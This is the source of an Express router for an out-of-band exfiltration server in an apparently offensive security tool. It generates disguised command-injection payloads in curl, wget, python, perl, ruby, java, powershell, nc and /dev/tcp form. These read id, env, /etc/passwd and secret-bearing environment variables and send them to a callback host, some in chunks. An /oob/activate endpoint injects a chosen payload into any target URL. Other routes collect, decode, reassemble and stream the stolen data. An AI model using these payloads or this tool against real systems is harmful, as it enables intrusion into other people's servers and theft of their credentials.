import { Router, type IRouter, type Request, type Response } from "express";
import { randomBytes } from "crypto";
import {
  addHit, getHits, clearHits, oobEvents,
  isRateLimited, generateToken, type OobHit,
} from "../oob/oobStore.js";
import {
  addChunk, getSessions, clearSessions, getSession, dnsEvents, type DnsSession,
} from "../oob/dnsReassembler.js";
import { createLogger } from "../lib/logger.js";
import { getOobCbBase } from "../lib/tunnelUrl.js";

const log    = createLogger("oob");
const router: IRouter = Router();

const WEBHOOK_URL = (process.env["OOB_WEBHOOK_URL"] ?? "").trim();

async function forwardToWebhook(hit: OobHit): Promise<void> {
  if (!WEBHOOK_URL) return;
  try {
    await fetch(WEBHOOK_URL, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(hit),
      signal:  AbortSignal.timeout(5_000),
    });
  } catch (err) {
    log.warn({ err }, "oob: webhook forward failed");
  }
}

function tryDecodeB64(raw: string): string {
  try {
    const decoded = Buffer.from(raw, "base64").toString("utf8");
    if (decoded.length > 0 && decoded.length <= raw.length * 2) return decoded;
    return raw;
  } catch {
    return raw;
  }
}

function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
  const cb = `${base}/${token}`;

  let cbHost = "localhost";
  let cbPort = "80";
  try {
    const u = new URL(base);
    cbHost  = u.hostname;
    cbPort  = u.port || (u.protocol === "https:" ? "443" : "80");
  } catch { /* keep defaults */ }

  const dnsBase = base.replace(/\/oob\/cb$/, "/oob/dns-chunk");

  return {
    wget_pixel:
      `wget -qO/dev/null --user-agent="Mozilla/5.0 AppleWebKit/537.36" "${cb}/pixel.gif?id=$(hostname|base64 -w0 2>/dev/null||hostname|base64)&d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    analytics_beacon:
      `_d=$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64); curl -sk -H "Referer: https://www.google-analytics.com/collect" -H "Content-Type: text/plain" "${cb}?v=1&tid=UA-000000&cid=\${_d:0:8}&t=pageview&dp=%2F&d=\${_d}" 2>/dev/null &`,

    python3_urllib:
      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();req=u.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'});u.urlopen(req)" 2>/dev/null &`,

    curl_font_fetch:
      `curl -sk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -H "Sec-Fetch-Dest: font" -H "Sec-Fetch-Mode: cors" "${cb}?d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    curl_post_xhr:
      `_o=$(id && uname -a && cat /etc/passwd 2>/dev/null|head -5); curl -sk --data-binary "id=$(hostname)&data=$(echo "\${_o}"|base64 -w0 2>/dev/null||echo "\${_o}"|base64)" "${cb}" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With: XMLHttpRequest" 2>/dev/null &`,

    bash_pipe_raw:
      `(id;uname -a;env;cat /etc/passwd 2>/dev/null|head -5)|curl -sk --data-binary @- '${cb}' 2>/dev/null &`,

    curl_exfil:
      `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${cb}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)" 2>/dev/null`,

    perl_http:
      `perl -MLWP::UserAgent -e "use MIME::Base64;my \$ua=LWP::UserAgent->new;my \$d=encode_base64(\`id && uname -a\`);chomp(\$d);\$ua->get('${cb}?d='.\$d)" 2>/dev/null &`,

    python3_socket:
      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cbHost}',${cbPort}));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n');s.close()" 2>/dev/null &`,

    bash_devtcp:
      `exec 3>/dev/tcp/${cbHost}/${cbPort} 2>/dev/null && printf 'GET /api/oob/cb/${token}?d='$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64)' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n'>&3 && exec 3>&- 2>/dev/null &`,

    java_url:
      `java -cp . -e "new java.net.URL(\\"${cb}?d=\\"+java.util.Base64.getEncoder().encodeToString(Runtime.getRuntime().exec(new String[]{\\"sh\\",\\"-c\\","id && uname -a\\"}).getInputStream().readAllBytes())).openStream().close();" 2>/dev/null & python3 -c "import urllib.request,base64,subprocess;urllib.request.urlopen('${cb}?d='+base64.b64encode(subprocess.check_output(['sh','-c','id && uname -a'],stderr=-1)).decode())" 2>/dev/null &`,

    powershell_iwr:
      `powershell -NoP -NonI -W Hidden -c "iwr -Uri '${cb}?d='+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((iex 'id 2>&1')))+'' -UseBasicParsing" 2>/dev/null & cmd /c "powershell -c \"$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c id 2^>^&1)));iwr -Uri '${cb}?d='+$d -UseBasicParsing\" 2>nul"`,

    ruby_oob:
      `ruby -e "require 'net/http';require 'base64';d=Base64.encode64(\`id && uname -a\`.strip);Net::HTTP.get(URI.parse('${cb}?d='+URI.encode_www_form_component(d)))" 2>/dev/null &`,

    nc_bash:
      `echo "$(id && uname -a && cat /etc/passwd 2>/dev/null|head -3)" | nc -w3 ${cbHost} ${cbPort} 2>/dev/null &`,

    dns_lookup:
      `nslookup $(id|md5sum|cut -c1-16).${cbHost} 2>/dev/null & dig +short $(hostname|tr '.' '-').${cbHost} 2>/dev/null &`,

    dns_chunk_passwd:
      `f=$(base64 -w0 /etc/passwd 2>/dev/null||base64 /etc/passwd|tr -d '\\n'); t=$(( (${`\${#f}`}+54)/55 )); i=0; idx=0; while [ $i -lt ${`\${#f}`} ]; do chunk="${`\${f:$i:55}`}"; curl -sk "${dnsBase}/${token}/p/$idx/$t?d=$chunk" >/dev/null 2>&1; i=$((i+55)); idx=$((idx+1)); sleep 0.05; done`,

    dns_chunk_env:
      `f=$(env|grep -iE '(pass|secret|key|token|api|auth|db|jwt)'|base64 -w0 2>/dev/null); t=$(( (${`\${#f}`}+54)/55 )); i=0; idx=0; while [ $i -lt ${`\${#f}`} ]; do chunk="${`\${f:$i:55}`}"; curl -sk "${dnsBase}/${token}/e/$idx/$t?d=$chunk" >/dev/null 2>&1; i=$((i+55)); idx=$((idx+1)); sleep 0.05; done`,
  };
}

/* ── GET /oob/token ──────────────────────────────────────────────────── */
router.get("/oob/token", (req: Request, res: Response) => {
  const token = generateToken();
  const base  = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
  log.info({ token: token.slice(0, 8) }, "oob: token issued");
  res.json({
    token,
    cbUrl:    `${base}/${token}`,
    payloads: buildPolymorphicPayloads(base, token),
  });
});

/* ── Callback receiver (GET + POST) ─────────────────────────────────── */
function receiveCallback(req: Request, res: Response): void {
  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    || req.socket.remoteAddress
    || "?";

  if (isRateLimited(sourceIp)) {
    res.status(429).send("rate limited");
    return;
  }

  const token   = (req.params as Record<string, string>)["token"] ?? "default";
  const rawData = (req.query as Record<string, string>)["d"] ?? (req.query as Record<string, string>)["data"] ?? "";

  const query   = Object.fromEntries(
    Object.entries(req.query as Record<string, unknown>).map(([k, v]) => [k, String(v)]),
  );
  const bodyStr = typeof req.body === "string"
    ? req.body
    : (req.body && typeof req.body === "object" && Object.keys(req.body as object).length)
      ? JSON.stringify(req.body)
      : "";

  const hit: OobHit = {
    id:        randomBytes(8).toString("hex"),
    ts:        Date.now(),
    type:      "http",
    token,
    sourceIp,
    method:    req.method,
    path:      req.path,
    query,
    body:      bodyStr,
    userAgent: (req.headers["user-agent"] as string) ?? "",
    size:      bodyStr.length,
    data:      rawData,
    headers:   Object.fromEntries(
      Object.entries(req.headers as Record<string, string | string[] | undefined>)
        .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : (v ?? "")]),
    ),
    receivedAt:  new Date().toISOString(),
    decodedData: rawData ? tryDecodeB64(rawData) : undefined,
  };

  addHit(hit);
  log.info({ token: token.slice(0, 8), sourceIp, method: req.method }, "oob: callback received");
  void forwardToWebhook(hit);

  res.setHeader("Content-Type", "image/gif");
  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64"));
}

router.get("/oob/cb/:token", receiveCallback);
router.post("/oob/cb/:token", receiveCallback);
router.get("/oob/cb",        receiveCallback);
router.post("/oob/cb",       receiveCallback);

/* ── Public router — only callback receivers (no auth required) ────── */
export const oobPublicRouter: IRouter = Router();
oobPublicRouter.get("/oob/cb/:token", receiveCallback);
oobPublicRouter.post("/oob/cb/:token", receiveCallback);
oobPublicRouter.get("/oob/cb",         receiveCallback);
oobPublicRouter.post("/oob/cb",        receiveCallback);
oobPublicRouter.get("/oob/dns-chunk/:token/:prefix/:idx/:total",  receiveDnsChunk);
oobPublicRouter.post("/oob/dns-chunk/:token/:prefix/:idx/:total", receiveDnsChunk);

/* ── GET /oob/hits — retrieve captured hits ─────────────────────────── */
router.get("/oob/hits", (_req: Request, res: Response) => {
  const hits = getHits();
  res.json({ count: hits.length, hits });
});

/* ── DELETE /oob/hits — clear hit log ──────────────────────────────── */
router.delete("/oob/hits", (_req: Request, res: Response) => {
  clearHits();
  res.json({ ok: true });
});

/* ── GET /oob/stats ─────────────────────────────────────────────────── */
router.get("/oob/stats", (_req: Request, res: Response) => {
  const hits = getHits();
  const byToken: Record<string, number> = {};
  const byIp:    Record<string, number> = {};
  let   withData = 0;

  for (const h of hits) {
    byToken[h.token]  = (byToken[h.token]  ?? 0) + 1;
    byIp[h.sourceIp]  = (byIp[h.sourceIp]  ?? 0) + 1;
    if (h.decodedData) withData++;
  }

  res.json({
    total:             hits.length,
    withData,
    uniqueTokens:      Object.keys(byToken).length,
    uniqueIPs:         Object.keys(byIp).length,
    byToken,
    byIp,
    webhookConfigured: Boolean(WEBHOOK_URL),
  });
});

/* ── GET /oob/hits/stream — SSE live stream of HTTP hits ─────────────── */
router.get("/oob/hits/stream", (req: Request, res: Response) => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection",    "keep-alive");
  res.flushHeaders();

  for (const h of getHits()) {
    res.write(`event: hit\ndata: ${JSON.stringify(h)}\n\n`);
  }

  const onHit = (hit: OobHit) => {
    try { res.write(`event: hit\ndata: ${JSON.stringify(hit)}\n\n`); } catch { /* client gone */ }
  };
  const onCleared = () => {
    try { res.write(`event: cleared\ndata: {}\n\n`); } catch { /* client gone */ }
  };

  oobEvents.on("hit",     onHit);
  oobEvents.on("cleared", onCleared);

  const ping = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
  }, 25_000);

  req.on("close", () => {
    oobEvents.off("hit",     onHit);
    oobEvents.off("cleared", onCleared);
    clearInterval(ping);
  });
});

/* ════════════════════════════════════════════════════════════════════════
   DNS CHUNK REASSEMBLY
   Receives HTTP-encoded DNS-exfil chunks and reassembles them in real-time.
   URL pattern: GET|POST /oob/dns-chunk/:token/:prefix/:idx/:total?d=<b64chunk>
   ════════════════════════════════════════════════════════════════════════ */

router.get("/oob/dns-chunk/:token/:prefix/:idx/:total", receiveDnsChunk);
router.post("/oob/dns-chunk/:token/:prefix/:idx/:total", receiveDnsChunk);

function receiveDnsChunk(req: Request, res: Response): void {
  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    || req.socket.remoteAddress || "?";

  if (isRateLimited(sourceIp)) {
    res.status(429).send("rate limited");
    return;
  }

  const p      = req.params as Record<string, string>;
  const token  = p["token"]  ?? "";
  const prefix = p["prefix"] ?? "x";
  const idx    = parseInt(p["idx"]   ?? "0", 10);
  const total  = parseInt(p["total"] ?? "1", 10);
  const chunk  = (req.query as Record<string, string>)["d"]
              ?? (req.query as Record<string, string>)["chunk"]
              ?? (typeof req.body === "string" ? req.body.trim() : "");

  if (!token || !chunk || isNaN(idx) || isNaN(total) || total < 1) {
    res.status(400).json({ error: "token, d, idx, total required" });
    return;
  }

  const session = addChunk(token, prefix, idx, total, chunk);
  log.info(
    { token: token.slice(0, 8), prefix, idx, total, received: session.received, complete: session.complete },
    "oob: dns chunk received",
  );

  res.setHeader("Content-Type", "image/gif");
  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64"));
}

/* ── POST /oob/activate — fire an OOB payload at a target URL ────── */
router.post("/oob/activate", async (req: Request, res: Response) => {
  const {
    targetUrl,
    payloadType = "curl_exfil",
    injectParam = "q",
    method      = "GET",
    token:      reqToken,
  } = req.body as {
    targetUrl?:   string;
    payloadType?: string;
    injectParam?: string;
    method?:      string;
    token?:       string;
  };

  if (!targetUrl) {
    res.status(400).json({ error: "targetUrl is required" });
    return;
  }

  let parsedUrl: URL;
  try { parsedUrl = new URL(targetUrl); }
  catch { res.status(400).json({ error: "Invalid targetUrl — must be a full URL with scheme" }); return; }

  const token   = reqToken || generateToken();
  const cbBase  = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
  const payloads = buildPolymorphicPayloads(cbBase, token);
  const payload  = payloads[payloadType] ?? payloads["curl_exfil"] ?? "";
  const cbUrl    = `${cbBase}/${token}`;

  const httpMethod = method.toUpperCase() === "POST" ? "POST" : "GET";
  const t0 = Date.now();
  let status: "sent" | "error" | "timeout" = "sent";
  let statusCode: number | null = null;
  let responseBody = "";
  let errorMsg: string | undefined;

  try {
    let fetchUrl: string;
    let fetchInit: RequestInit;

    if (httpMethod === "POST") {
      fetchUrl = targetUrl;
      fetchInit = {
        method:  "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        },
        body:   `${encodeURIComponent(injectParam)}=${encodeURIComponent(payload)}`,
        signal: AbortSignal.timeout(12_000),
      };
    } else {
      const u = new URL(parsedUrl.toString());
      u.searchParams.set(injectParam, payload);
      fetchUrl = u.toString();
      fetchInit = {
        method:  "GET",
        headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
        signal:  AbortSignal.timeout(12_000),
      };
    }

    const r = await fetch(fetchUrl, fetchInit);
    statusCode = r.status;
    const ct = r.headers.get("content-type") ?? "";
    if (ct.includes("text") || ct.includes("json")) {
      responseBody = (await r.text()).slice(0, 512);
    }
  } catch (err) {
    const e = err as Error;
    if (e.name === "TimeoutError" || e.name === "AbortError") {
      status   = "timeout";
      errorMsg = "Request timed out after 12s — target may be filtering or slow";
    } else {
      status   = "error";
      errorMsg = e.message;
    }
  }

  const responseMs = Date.now() - t0;
  log.info(
    { targetUrl, payloadType, token: token.slice(0, 8), status, statusCode, responseMs },
    "oob: activate fired",
  );

  res.json({
    ok:          status !== "error",
    token,
    cbUrl,
    payload,
    payloadType,
    targetUrl,
    method:      httpMethod,
    injectParam,
    status,
    statusCode,
    responseMs,
    responseBody,
    error:       errorMsg,
    hint:        "Watch the OOB listener for incoming callbacks on this token",
  });
});

/* ── GET /oob/dns-sessions — list all reassembly sessions ─────────── */
router.get("/oob/dns-sessions", (_req: Request, res: Response) => {
  const sessions = getSessions();
  res.json({ count: sessions.length, sessions });
});

/* ── GET /oob/dns-sessions/:key — get single session ──────────────── */
router.get("/oob/dns-sessions/:key", (req: Request, res: Response) => {
  const key = (req.params as Record<string, string>)["key"] ?? "";
  const session = getSession(decodeURIComponent(key));
  if (!session) { res.status(404).json({ error: "not found" }); return; }
  res.json(session);
});

/* ── DELETE /oob/dns-sessions — clear all sessions ─────────────────── */
router.delete("/oob/dns-sessions", (_req: Request, res: Response) => {
  clearSessions();
  res.json({ ok: true });
});

/* ── GET /oob/dns-sessions/stream — SSE live stream of DNS events ─── */
router.get("/oob/dns-sessions/stream", (req: Request, res: Response) => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection",    "keep-alive");
  res.flushHeaders();

  for (const s of getSessions()) {
    res.write(`event: session\ndata: ${JSON.stringify(s)}\n\n`);
  }

  const onChunk = (data: unknown) => {
    try { res.write(`event: chunk\ndata: ${JSON.stringify(data)}\n\n`); } catch { /* gone */ }
  };
  const onComplete = (session: DnsSession) => {
    try { res.write(`event: complete\ndata: ${JSON.stringify(session)}\n\n`); } catch { /* gone */ }
  };
  const onCleared = () => {
    try { res.write(`event: cleared\ndata: {}\n\n`); } catch { /* gone */ }
  };

  dnsEvents.on("chunk",    onChunk);
  dnsEvents.on("complete", onComplete);
  dnsEvents.on("cleared",  onCleared);

  const ping = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
  }, 25_000);

  req.on("close", () => {
    dnsEvents.off("chunk",    onChunk);
    dnsEvents.off("complete", onComplete);
    dnsEvents.off("cleared",  onCleared);
    clearInterval(ping);
  });
});

export default router;
